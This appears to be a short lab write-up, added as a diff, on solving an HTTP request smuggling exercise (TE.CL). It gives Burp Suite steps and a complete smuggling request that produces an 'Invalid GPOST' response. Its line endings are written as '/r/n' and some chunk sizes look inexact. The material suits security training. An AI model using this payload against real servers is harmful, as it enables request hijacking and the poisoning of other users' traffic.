@@ -1,0 +1,32 @@
+
+
+
+
+                                   LAB #2 :- HTTP request smuggling, basic TE.CL vulnerability
+                                   Here client is validating Transfer-Encoding and server is validating Content-Length
+                                
+                                STEPS TO REPRODUCE:-
+
+                            1. Configure your browser with a proxy tool such as Burp Suite.
+                            2. In the application refresh the page.
+                            3. Go to Burp History tab and send the request with path / to Burp Repeater.
+                            4. In the Repeater, in the request attribute change the protocol from HTTP/2.0 to HTTP/1.1
+                            5. Change the request type from GET to POST.
+                            6. In the Burp setting uncheck the update-content-length header option.
+                            7. Use this request in the request field.
+                            POST / HTTP/1.1/r/n
+                            Host: Your-Application-Host/r/n
+                            Content-Length: 3/r/n
+                            Transfer-Encoding: chunked/r/n
+                            /r/n
+                            5c/r/n
+                            GPOST / HTTP/1.1/r/n
+                            Content-Length: 8/r/n
+                            /r/n
+                            8/r/n
+                            0/r/n
+                            /r/n
+                            8. Click on send Observe the response it's 200 OK 
+                            9. Again click on send and Observe the response it's "Invalid GPOST" and the lab is solved.
+
+                            
